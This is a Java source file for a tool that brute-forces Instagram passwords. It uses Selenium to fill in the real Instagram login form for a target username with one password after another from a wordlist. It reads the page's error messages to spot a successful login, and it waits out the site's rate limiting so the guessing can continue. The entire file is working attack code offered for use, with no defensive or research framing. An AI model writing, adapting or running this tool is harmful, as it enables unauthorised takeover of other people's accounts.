package com.mejidprojects.instabruteforce;

import org.openqa.selenium.*;
import org.openqa.selenium.chrome.ChromeDriver;
import org.openqa.selenium.support.ui.ExpectedConditions;
import org.openqa.selenium.support.ui.WebDriverWait;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.time.Duration;

public class InstaBrute {
    private final String website = "https://www.instagram.com";
    private final String selectorPassword = "#loginForm > div > div:nth-child(2) > div > label > input",
            selectorLogin = "#loginForm > div > div:nth-child(3) > button", errorBox = "#slfErrorAlert";
    private final String username;

    private WebDriver driver;
    private File list;
    private boolean allRight = false;

    public InstaBrute(String username, String listPath, String chromeDriver) {
        this.username = username;
        // check if file list is working
        if (!isFileExists(listPath)) {
            System.out.println("[!] This file is not exists > [" + listPath + "]");
            return;
        }
        // check if file of chrome driver is exists
        File chromedriver = new File(chromeDriver);
        if (chromedriver.isFile() && chromedriver.exists()) System.out.println("[+] Checking Chrome Driver Successfully Completed.");
        else {
            System.out.println("[-] Chrome Driver not found or path you entered wrong, Please check and try again.");
            return;
        }
        // initialisation of chrome driver
        System.setProperty("webdriver.chrome.driver", chromeDriver);
        driver = new ChromeDriver();
        System.out.println("[*] Trying to connect with the website...");
        // check the network connection
        if (connect()) System.out.println("[+] Website is working");
        else {
            System.out.println("[!] Website not working, check you internet connection & please try again");
            return;
        }
        allRight = true;
    }

    public void startBruteForce() {
        if (allRight) readWordList();
        else System.out.println("[-] Something wrong, Please check and try again.");
    }

    private void readWordList() {
        try {
            if (list.isDirectory()) {
                System.out.println("[!] Please enter a correct wordlist path, this is directory !");
                return;
            }
            BufferedReader reader = new BufferedReader(new FileReader(list));
            String line = reader.readLine();
            while (line != null) {
                // get the website
                driver.get(website);
                WebDriverWait wait = new WebDriverWait(driver, Duration.ofSeconds(10));
                // initialize inputs
                String selectorUsername = "#loginForm > div > div:nth-child(1) > div > label > input";
                WebElement inputUsername = wait.until(ExpectedConditions.presenceOfElementLocated(By.cssSelector(selectorUsername)));
                WebElement inputPass = wait.until(ExpectedConditions.presenceOfElementLocated(By.cssSelector(selectorPassword)));
                // enter the info and click the button of login
                inputUsername.sendKeys(username);
                inputPass.sendKeys(line);
                // click the button of login while it become visible
                wait.until(ExpectedConditions.elementToBeClickable(By.cssSelector(selectorLogin))).click();
                // wait until checking of the info completed
                Thread.sleep(1000);
                // check if the password is correct
                boolean isLoggedIn = false;
                WebElement passWrong = wait.until(ExpectedConditions.presenceOfElementLocated(By.cssSelector(errorBox)));
                if (passWrong.getText().equals("Sorry, your password was incorrect. Please double-check your password.")) {
                    System.out.println("[-] Password incorrect -> Username (" + username + ") & Password (" + line + ")");
                }
                else {
                    try {
                        isLoggedIn = new WebDriverWait(driver, Duration.ofSeconds(3))
                                .until(ExpectedConditions.urlToBe("https://www.instagram.com/accounts/onetap/?next=%2F"));
                    } catch (Exception e) {
                        // nothing to do
                    }
                }
                if (isLoggedIn) {
                    System.out.println("[+] Logged in successfully -> Username (" + username + ") & Password (" + line + ")");
                    break;
                }

                // wait 5 minutes to skip limitation
                boolean error = false;
                try {
                    error = wait.until(ExpectedConditions.presenceOfElementLocated(By.cssSelector(errorBox)))
                            .getText().equals("Please wait a few minutes before you try again."); // handle this alert message
                }
                catch (NoSuchElementException | TimeoutException e) {
                    // nothing to do
                    // System.out.println("[+] No limitation right now.");
                }
                if (error) {
                    System.out.println("[!] Wait 5 minutes to continue...");
                    Thread.sleep((5 * 1000) * 60);
                }

                line = reader.readLine();
            }
        }
        catch (Exception e) {
            e.printStackTrace();
        }
    }
    // check if file path is exists
    private boolean isFileExists(String path) {
        list = new File(path);
        return list.exists();
    }
    // check the website url is working
    private boolean connect() {
        try {
            HttpURLConnection connection = (HttpURLConnection) new URL(website).openConnection();
            return connection.getResponseCode() == HttpURLConnection.HTTP_OK;
        } catch (IOException e) {
            e.printStackTrace();
            return false;
        }
    }
}
